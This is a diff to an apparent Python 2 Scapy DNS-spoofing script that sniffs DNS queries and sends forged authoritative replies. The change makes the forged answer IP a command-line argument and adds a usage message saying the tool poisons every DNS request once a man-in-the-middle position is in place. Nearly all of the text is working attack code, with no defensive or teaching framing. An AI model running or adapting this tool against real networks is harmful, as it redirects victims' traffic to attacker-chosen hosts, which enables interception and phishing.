@@ -1,4 +1,5 @@
 #!/usr/bin/python
+import sys
 from scapy.all import *
 
 ################################################################
@@ -33,7 +34,7 @@ def run_dns_spoof():
         deport = pkts[0][UDP].dport
       resp = IP(proto = 'udp', src = pkts[0][IP].dst, dst = pkts[0][IP].src, id = pkts[0][IP].id)/\
              UDP(sport = 53, dport = deport) /\
-             DNS(id = pkts[0][DNS].id, qr = 1L, opcode ='QUERY', aa = 1L, rd = 1L, ancount = 1, qd = pkts[0][DNS].qd, an=DNSRR(rrname=pkts[0][DNS].qd.qname, ttl = 80, rdata = '167.206.145.40'))
+             DNS(id = pkts[0][DNS].id, qr = 1L, opcode ='QUERY', aa = 1L, rd = 1L, ancount = 1, qd = pkts[0][DNS].qd, an=DNSRR(rrname=pkts[0][DNS].qd.qname, ttl = 80, rdata = sys.argv[1]))
       print '#'*50
       print '-[Req Detectado]'
       print pkts[0].show()
@@ -50,8 +51,16 @@ def run_dns_spoof():
       print pkts[0].show()
       print '#'*50
 
+def usage():
+  print """Scapy_DNS_Poison.py IP_Address
+This program will spoof DNS requests (all of them) modifying the response to have the IP_Address as destination
+This program requires a MiTM already running"""
+
 def main():
-  run_dns_spoof()
+  if len(sys.argv) < 2:
+    usage()
+  else:
+    run_dns_spoof()
   
 # Standard Boiler plate
 if __name__ == '__main__':
